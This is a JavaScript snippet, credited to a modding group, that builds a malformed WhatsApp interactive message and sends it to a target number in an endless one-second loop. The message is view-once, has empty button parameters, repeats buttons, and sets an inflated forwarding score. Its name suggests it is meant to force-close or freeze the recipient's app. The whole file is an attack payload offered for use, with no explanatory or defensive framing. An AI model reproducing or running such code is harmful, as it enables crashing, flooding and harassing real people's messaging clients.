/*CREATE BY RAJA MODDERS × DITZ TAMVANZZ */
async function BetaBlankFc(isTarget) {
    let Msg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: ["@s.whatsapp.net"],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: isTarget,
                        },
                    },
                    body: {
                        text: "Aditz is here",
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: "" },
                            { name: "call_permission_request", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                        ],
                    },
                },
            },
        },
    };

    while (true) {
        await sock.relayMessage(isTarget, Msg, { participant: { jid: isTarget } });
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}